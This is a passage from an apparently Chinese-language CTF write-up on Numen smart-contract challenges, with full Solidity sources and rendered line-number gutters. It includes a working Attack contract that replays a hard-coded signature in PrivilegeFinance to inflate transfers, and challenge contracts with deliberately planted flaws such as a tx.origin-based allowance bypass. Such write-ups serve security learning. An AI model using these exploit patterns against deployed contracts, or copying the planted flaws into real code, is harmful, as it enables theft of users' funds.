class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract PrivilegeFinance &#123; </span><br><span class="line">    </span><br><span class="line">    string public name = &quot;Privilege Finance&quot;;</span><br><span class="line">    string public symbol = &quot;PF&quot;;</span><br><span class="line">    uint256 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 200000000000;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; address) public referrers;</span><br><span class="line"></span><br><span class="line">    string msgsender = &#x27;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&#x27;;</span><br><span class="line"></span><br><span class="line">    uint public rewmax = 65000000000000000000000;</span><br><span class="line">    uint public time = 1677729607;</span><br><span class="line">    uint public Timeinterval = 600;</span><br><span class="line">    uint public Timewithdraw = 6000;</span><br><span class="line">    uint public Timeintervallimit = block.timestamp;</span><br><span class="line">    uint public Timewithdrawlimit = block.timestamp;</span><br><span class="line"></span><br><span class="line">    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;</span><br><span class="line">    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;</span><br><span class="line">    uint8 v = 28;</span><br><span class="line"></span><br><span class="line">    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;</span><br><span class="line">    </span><br><span class="line">    uint public burnFees = 2;</span><br><span class="line">    uint public ReferrerFees = 8;</span><br><span class="line">    uint public transferRate = 10;</span><br><span class="line">    address public BurnAddr = 0x000000000000000000000000000000000000dEaD;</span><br><span class="line">    bool public flag;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        balances[address(this)] = totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Airdrop() public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0 &amp;&amp; block.timestamp &gt;= Timeintervallimit,&quot;Collection time not reached&quot;);</span><br><span class="line">        balances[msg.sender] += 1000;</span><br><span class="line">        balances[address(this)] -= 1000;</span><br><span class="line">        Timeintervallimit += Timeinterval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address token, uint256 amount, address _ReferrerAddress) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;amount zero!&quot;);</span><br><span class="line">        if (msg.sender != address(0) &amp;&amp; _ReferrerAddress != address(0) &amp;&amp; msg.sender != _ReferrerAddress &amp;&amp; referrers[msg.sender] == address(0)) &#123;</span><br><span class="line">            referrers[msg.sender] = _ReferrerAddress;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[address(this)] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function withdraw(address token, uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0 &amp;&amp; block.timestamp &gt;= Timewithdrawlimit,&quot;Collection time not reached&quot;);</span><br><span class="line">        require(amount &gt; 0 &amp;&amp; amount &lt;= 2000,&quot;Financial restrictions&quot;);</span><br><span class="line">        Timewithdrawlimit += Timewithdraw;</span><br><span class="line">        require(amount &gt; 0, &quot;amount zero!&quot;);</span><br><span class="line">        balances[msg.sender] += amount;</span><br><span class="line">        balances[address(this)] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function DynamicRew(address _msgsender,uint _blocktimestamp,uint _ReferrerFees,uint _transferRate) public returns(address) &#123;</span><br><span class="line">        require(_blocktimestamp &lt; 1677729610, &quot;Time mismatch&quot;);</span><br><span class="line">        require(_transferRate &lt;= 50 &amp;&amp; _transferRate &lt;= 50);</span><br><span class="line">        bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));</span><br><span class="line">        address a = ecrecover(_hash, v, r, s);</span><br><span class="line">        require(a == admin &amp;&amp; time &lt; _blocktimestamp, &quot;time or banker&quot;);</span><br><span class="line">        ReferrerFees = _ReferrerFees;</span><br><span class="line">        transferRate = _transferRate;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient,uint256 amount) public &#123;</span><br><span class="line">        if(msg.sender == admin)&#123;</span><br><span class="line">            uint256 _fee = amount * transferRate / 100;</span><br><span class="line">            _transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);</span><br><span class="line">            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);</span><br><span class="line">            _transfer(address(this), recipient, amount * amount * transferRate);</span><br><span class="line">            amount = amount - _fee;</span><br><span class="line"></span><br><span class="line">        &#125;else if(recipient == admin)&#123;</span><br><span class="line">            uint256 _fee = amount * transferRate / 100;</span><br><span class="line">            _transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);</span><br><span class="line">            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);</span><br><span class="line">            amount = amount - _fee;</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address _to, uint _value) internal returns (bool) &#123;</span><br><span class="line">        balances[from] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setflag() public &#123;</span><br><span class="line">        if(balances[msg.sender] &gt; 10000000)&#123;</span><br><span class="line">            flag = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-5"><a href="#Analyse-5" class="headerlink" title="Analyse"></a>Analyse</h2><p>只需要通过DynamicRew来调整汇率，从而transfer更多的钱，来完成，DynamicRew中需要特定的msg.sender与blocktimestamp来完成验签，题目中msg.sender差一位，1677729607&lt;blocktimestamp&lt;1677729610</p><p>寻找地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    address1 = address + <span class="built_in">str</span>(i).rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (address1 == Web3.toChecksumAddress(address1)):</span><br><span class="line">        <span class="built_in">print</span>(address1)</span><br></pre></td></tr></table></figure><h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">     bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;</span><br><span class="line">    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;</span><br><span class="line">    uint8 v = 28;</span><br><span class="line">    uint a=65000000000000000000000;</span><br><span class="line">    address public _msgsender=0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053;</span><br><span class="line">    uint public _blocktimestamp=1677729609;</span><br><span class="line">    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;</span><br><span class="line">    PrivilegeFinance public target;</span><br><span class="line">    constructor(address add)&#123;</span><br><span class="line">        target=PrivilegeFinance(add);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack()public&#123;</span><br><span class="line">        target.Airdrop();</span><br><span class="line">        target.deposit(msg.sender,1,msg.sender);</span><br><span class="line">        target.DynamicRew(_msgsender,_blocktimestamp,1000000000,50);</span><br><span class="line">        target.transfer(admin,10);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x07-LittleMoney-未解决）"><a href="#0x07-LittleMoney-未解决）" class="headerlink" title="0x07 LittleMoney(未解决）"></a>0x07 LittleMoney(未解决）</h1><h2 id="Source-Code-6"><a href="#Source-Code-6" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.12;</span><br><span class="line">contract Numen &#123;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    event SendFlag(address);</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    struct func&#123;</span><br><span class="line">        function() internal ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkPermission(address addr)&#123;</span><br><span class="line">        _;</span><br><span class="line">        permission(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function permission(address addr)internal view&#123;</span><br><span class="line">        bool con = calcCode(addr);</span><br><span class="line">        require(con,&quot;permission&quot;);</span><br><span class="line">        require(msg.sender == addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calcCode(address addr)internal view returns(bool)&#123; </span><br><span class="line">        uint x;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            x := extcodesize(addr)</span><br><span class="line">        &#125;</span><br><span class="line">        if(x == 0)&#123;return false;&#125;</span><br><span class="line">        else if(x &gt; 12)&#123;return false;&#125;</span><br><span class="line">        else&#123;assembly&#123;return(0x20,0x20)&#125;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address target) external checkPermission(target)&#123;</span><br><span class="line">        (bool success,) = target.delegatecall(abi.encode(bytes4(keccak256(&quot;func()&quot;))));</span><br><span class="line">        require(!success,&quot;no cover!&quot;);</span><br><span class="line">        uint b;</span><br><span class="line">        uint v;</span><br><span class="line">        (b,v) = getReturnData();</span><br><span class="line">        require(b == block.number);</span><br><span class="line"></span><br><span class="line">        func memory set;</span><br><span class="line">        set.ptr = renounce;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(set, add(mload(set),v))</span><br><span class="line">        &#125;</span><br><span class="line">        set.ptr();</span><br><span class="line">    &#125;//0x22a</span><br><span class="line"></span><br><span class="line">    function renounce()public&#123;</span><br><span class="line">        require(owner != address(0));</span><br><span class="line">        owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getReturnData()internal pure returns(uint b,uint v)&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            if iszero(eq(returndatasize(), 0x40)) &#123; revert(0, 0) &#125;</span><br><span class="line">            let ptr := mload(0x40)</span><br><span class="line">            returndatacopy(ptr, 0, 0x40)</span><br><span class="line">            b := and(mload(ptr), 0x00000000000000000000000000000000000000000000000000000000ffffffff)</span><br><span class="line">            v := mload(add(0x20, ptr))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() public payable onlyOwner &#123;</span><br><span class="line">        require(msg.value == 1, &#x27;I only need a little money!&#x27;);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">   //0x1f5</span><br><span class="line"></span><br><span class="line">    receive()external payable&#123;</span><br><span class="line">        this;</span><br><span class="line">    &#125;</span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-6"><a href="#Analyse-6" class="headerlink" title="Analyse"></a>Analyse</h2><p>遇到assembly的return会提前终止</p><h1 id="0x08ApplePool"><a href="#0x08ApplePool" class="headerlink" title="0x08ApplePool"></a>0x08ApplePool</h1><h1 id="0x09NumenWallet"><a href="#0x09NumenWallet" class="headerlink" title="0x09NumenWallet"></a>0x09NumenWallet</h1><h2 id="Source-Code-7"><a href="#Source-Code-7" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.15;</span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Interface of the ERC20 standard as defined in the EIP.</span><br><span class="line"> */</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Emitted when `value` tokens are moved from one account (`from`) to</span><br><span class="line">     * another (`to`).</span><br><span class="line">     *</span><br><span class="line">     * Note that `value` may be zero.</span><br><span class="line">     */</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Emitted when the allowance of a `spender` for an `owner` is set by</span><br><span class="line">     * a call to &#123;approve&#125;. `value` is the new allowance.</span><br><span class="line">     */</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens in existence.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens owned by `account`.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from the caller&#x27;s account to `to`.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the remaining number of tokens that `spender` will be</span><br><span class="line">     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is</span><br><span class="line">     * zero by default.</span><br><span class="line">     *</span><br><span class="line">     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets `amount` as the allowance of `spender` over the caller&#x27;s tokens.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * IMPORTANT: Beware that changing an allowance with this method brings the risk</span><br><span class="line">     * that someone may use both the old and the new allowance by unfortunate</span><br><span class="line">     * transaction ordering. One possible solution to mitigate this race</span><br><span class="line">     * condition is to first reduce the spender&#x27;s allowance to 0 and set the</span><br><span class="line">     * desired value afterwards:</span><br><span class="line">     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from `from` to `to` using the</span><br><span class="line">     * allowance mechanism. `amount` is then deducted from the caller&#x27;s</span><br><span class="line">     * allowance.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NC is IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _mint(msg.sender, 100 * 10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        _spendAllowance(from, msg.sender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(</span><br><span class="line">            fromBalance &gt;= amount,</span><br><span class="line">            &quot;ERC20: transfer amount exceeds balance&quot;</span><br><span class="line">        );</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        if (tx.origin == admin) &#123;</span><br><span class="line">            require(msg.sender.code.length &gt; 0);</span><br><span class="line">            _allowances[spender][tx.origin] = amount;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        